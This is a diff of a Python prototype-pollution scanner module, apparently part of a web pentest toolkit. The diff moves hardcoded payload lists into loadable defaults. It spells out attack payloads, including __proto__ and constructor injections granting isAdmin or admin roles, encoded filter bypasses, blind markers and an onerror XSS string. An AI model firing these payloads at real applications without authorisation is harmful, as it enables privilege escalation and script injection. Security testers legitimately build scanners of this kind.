@@ -17,164 +17,220 @@ Fluxo:
 """
 import argparseimport loggingimport timefrom dataclasses import asdict, dataclassimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.prototypepollution")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
-    "detect": ["proto_basic", "proto_admin", "proto_role", "proto_settings", "proto_version"],
-    "constructor": ["ctor_basic", "ctor_admin", "ctor_role", "ctor_proto", "ctor_inject"],
-    "bypass": ["url_encode", "double_encode", "nested", "array_bracket", "dot_notation"],
-    "blind": ["blind_timing", "blind_reflection", "blind_stored", "blind_header", "blind_cookie"],
-    "impact": ["impact_isadmin", "impact_role", "impact_settings", "impact_rce", "impact_xss"],
-}
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
+    "detect": ["proto_basic", "proto_admin", "proto_role", "proto_settings", "proto_version"],
+    "constructor": ["ctor_basic", "ctor_admin", "ctor_role", "ctor_proto", "ctor_inject"],
+    "bypass": ["url_encode", "double_encode", "nested", "array_bracket", "dot_notation"],
+    "blind": ["blind_timing", "blind_reflection", "blind_stored", "blind_header", "blind_cookie"],
+    "impact": ["impact_isadmin", "impact_role", "impact_settings", "impact_rce", "impact_xss"],
+}
+
+
+def _load_category_map():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+_CATEGORY_MAP = _load_category_map()
 
-_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    (
-        "proto_basic",
-        '{"__proto__":{"polluted":true}}',
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "proto_admin",
-        '{"__proto__":{"isAdmin":true}}',
-        ["isAdmin", "true", "admin"],
-    ),
-    (
-        "proto_role",
-        '{"__proto__":{"role":"admin"}}',
-        ["role", "admin"],
-    ),
-    (
-        "proto_settings",
-        '{"__proto__":{"settings":{"debug":true}}}',
-        ["settings", "debug", "true"],
-    ),
-    (
-        "proto_version",
-        '{"__proto__":{"version":"9.9.9"}}',
-        ["version", "9.9.9"],
-    ),
-]
+_DETECT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+    (
+        "proto_basic",
+        '{"__proto__":{"polluted":true}}',
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "proto_admin",
+        '{"__proto__":{"isAdmin":true}}',
+        ["isAdmin", "true", "admin"],
+    ),
+    (
+        "proto_role",
+        '{"__proto__":{"role":"admin"}}',
+        ["role", "admin"],
+    ),
+    (
+        "proto_settings",
+        '{"__proto__":{"settings":{"debug":true}}}',
+        ["settings", "debug", "true"],
+    ),
+    (
+        "proto_version",
+        '{"__proto__":{"version":"9.9.9"}}',
+        ["version", "9.9.9"],
+    ),
+]
+
+
+def _load_detect_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"detect_payloads": _DETECT_PAYLOADS_DEFAULT})
+    return [tuple(x) for x in data.get("detect_payloads", _DETECT_PAYLOADS_DEFAULT)]
+
+_DETECT_PAYLOADS = _load_detect_payloads()
 
-_CONSTRUCTOR_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    (
-        "ctor_basic",
-        '{"constructor":{"prototype":{"polluted":true}}}',
-        ["polluted", "true", "prototype"],
-    ),
-    (
-        "ctor_admin",
-        '{"constructor":{"prototype":{"isAdmin":true}}}',
-        ["isAdmin", "true"],
-    ),
-    (
-        "ctor_role",
-        '{"constructor":{"prototype":{"role":"admin"}}}',
-        ["role", "admin"],
-    ),
-    (
-        "ctor_proto",
-        '{"constructor":{"prototype":{"__proto__":{"polluted":true}}}}',
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "ctor_inject",
-        '{"constructor":{"prototype":{"toString":"polluted"}}}',
-        ["toString", "polluted"],
-    ),
-]
+_CONSTRUCTOR_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+    (
+        "ctor_basic",
+        '{"constructor":{"prototype":{"polluted":true}}}',
+        ["polluted", "true", "prototype"],
+    ),
+    (
+        "ctor_admin",
+        '{"constructor":{"prototype":{"isAdmin":true}}}',
+        ["isAdmin", "true"],
+    ),
+    (
+        "ctor_role",
+        '{"constructor":{"prototype":{"role":"admin"}}}',
+        ["role", "admin"],
+    ),
+    (
+        "ctor_proto",
+        '{"constructor":{"prototype":{"__proto__":{"polluted":true}}}}',
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "ctor_inject",
+        '{"constructor":{"prototype":{"toString":"polluted"}}}',
+        ["toString", "polluted"],
+    ),
+]
+
+
+def _load_constructor_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"constructor_payloads": _CONSTRUCTOR_PAYLOADS_DEFAULT})
+    return [tuple(x) for x in data.get("constructor_payloads", _CONSTRUCTOR_PAYLOADS_DEFAULT)]
+
+_CONSTRUCTOR_PAYLOADS = _load_constructor_payloads()
 
-_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    (
-        "url_encode",
-        "%5B__proto__%5D%5Bpolluted%5D=true",
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "double_encode",
-        "%255B__proto__%255D%255Bpolluted%255D=true",
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "nested",
-        '{"__proto__":{"__proto__":{"polluted":true}}}',
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "array_bracket",
-        "__proto__[polluted]=true",
-        ["polluted", "true", "__proto__"],
-    ),
-    (
-        "dot_notation",
-        "__proto__.polluted=true",
-        ["polluted", "true", "__proto__"],
-    ),
-]
+_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+    (
+        "url_encode",
+        "%5B__proto__%5D%5Bpolluted%5D=true",
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "double_encode",
+        "%255B__proto__%255D%255Bpolluted%255D=true",
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "nested",
+        '{"__proto__":{"__proto__":{"polluted":true}}}',
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "array_bracket",
+        "__proto__[polluted]=true",
+        ["polluted", "true", "__proto__"],
+    ),
+    (
+        "dot_notation",
+        "__proto__.polluted=true",
+        ["polluted", "true", "__proto__"],
+    ),
+]
+
+
+def _load_bypass_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"bypass_payloads": _BYPASS_PAYLOADS_DEFAULT})
+    return [tuple(x) for x in data.get("bypass_payloads", _BYPASS_PAYLOADS_DEFAULT)]
+
+_BYPASS_PAYLOADS = _load_bypass_payloads()
 
-_BLIND_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
-    (
-        "blind_timing",
-        '{"__proto__":{"timeout":999999}}',
-        "timeout",
-        ["timeout", "999999"],
-    ),
-    (
-        "blind_reflection",
-        '{"__proto__":{"reflected":"PP_TEST_7X9K2"}}',
-        "PP_TEST_7X9K2",
-        ["PP_TEST_7X9K2"],
-    ),
-    (
-        "blind_stored",
-        '{"__proto__":{"stored":"PP_STORED_3M8N5"}}',
-        "stored",
-        ["PP_STORED_3M8N5"],
-    ),
-    (
-        "blind_header",
-        '{"__proto__":{"x-custom-header":"PP_HDR_4L6P1"}}',
-        "x-custom-header",
-        ["PP_HDR_4L6P1"],
-    ),
-    (
-        "blind_cookie",
-        '{"__proto__":{"session":"PP_SESS_2K7W9"}}',
-        "session",
-        ["PP_SESS_2K7W9"],
-    ),
-]
+_BLIND_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
+    (
+        "blind_timing",
+        '{"__proto__":{"timeout":999999}}',
+        "timeout",
+        ["timeout", "999999"],
+    ),
+    (
+        "blind_reflection",
+        '{"__proto__":{"reflected":"PP_TEST_7X9K2"}}',
+        "PP_TEST_7X9K2",
+        ["PP_TEST_7X9K2"],
+    ),
+    (
+        "blind_stored",
+        '{"__proto__":{"stored":"PP_STORED_3M8N5"}}',
+        "stored",
+        ["PP_STORED_3M8N5"],
+    ),
+    (
+        "blind_header",
+        '{"__proto__":{"x-custom-header":"PP_HDR_4L6P1"}}',
+        "x-custom-header",
+        ["PP_HDR_4L6P1"],
+    ),
+    (
+        "blind_cookie",
+        '{"__proto__":{"session":"PP_SESS_2K7W9"}}',
+        "session",
+        ["PP_SESS_2K7W9"],
+    ),
+]
+
+
+def _load_blind_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"blind_payloads": _BLIND_PAYLOADS_DEFAULT})
+    return [tuple(x) for x in data.get("blind_payloads", _BLIND_PAYLOADS_DEFAULT)]
+
+_BLIND_PAYLOADS = _load_blind_payloads()
 
-_IMPACT_PAYLOADS: list[tuple[str, str, list[str]]] = [
-    (
-        "impact_isadmin",
-        '{"__proto__":{"isAdmin":true}}',
-        ["isAdmin", "true", "admin", "authorized"],
-    ),
-    (
-        "impact_role",
-        '{"__proto__":{"role":"admin"}}',
-        ["role", "admin", "administrator"],
-    ),
-    (
-        "impact_settings",
-        '{"__proto__":{"settings":{"debug":true,"admin":true}}}',
-        ["settings", "debug", "admin", "true"],
-    ),
-    (
-        "impact_rce",
-        '{"__proto__":{"child_process":{}}}',
-        ["child_process", "exec", "spawn"],
-    ),
-    (
-        "impact_xss",
-        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
-        ["innerHTML", "alert", "onerror"],
-    ),
-]
+_IMPACT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
+    (
+        "impact_isadmin",
+        '{"__proto__":{"isAdmin":true}}',
+        ["isAdmin", "true", "admin", "authorized"],
+    ),
+    (
+        "impact_role",
+        '{"__proto__":{"role":"admin"}}',
+        ["role", "admin", "administrator"],
+    ),
+    (
+        "impact_settings",
+        '{"__proto__":{"settings":{"debug":true,"admin":true}}}',
+        ["settings", "debug", "admin", "true"],
+    ),
+    (
+        "impact_rce",
+        '{"__proto__":{"child_process":{}}}',
+        ["child_process", "exec", "spawn"],
+    ),
+    (
+        "impact_xss",
+        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
+        ["innerHTML", "alert", "onerror"],
+    ),
+]
+
+
+def _load_impact_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"impact_payloads": _IMPACT_PAYLOADS_DEFAULT})
+    return [tuple(x) for x in data.get("impact_payloads", _IMPACT_PAYLOADS_DEFAULT)]
+
+_IMPACT_PAYLOADS = _load_impact_payloads()
 
-_SSI_PARAMS: list[str] = [
-    "data", "json", "payload", "input", "value",
-    "content", "body", "params", "query", "config",
-    "options", "settings", "item", "object", "model",
-]
+_SSI_PARAMS_DEFAULT: list[str] = [
+    "data", "json", "payload", "input", "value",
+    "content", "body", "params", "query", "config",
+    "options", "settings", "item", "object", "model",
+]
+
+
+def _load_ssi_params():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "prototypepollution", default={"ssi_params": _SSI_PARAMS_DEFAULT})
+    return data.get("ssi_params", _SSI_PARAMS_DEFAULT)
+
+_SSI_PARAMS = _load_ssi_params()
 
 
 @dataclass(frozen=True, slots=True)
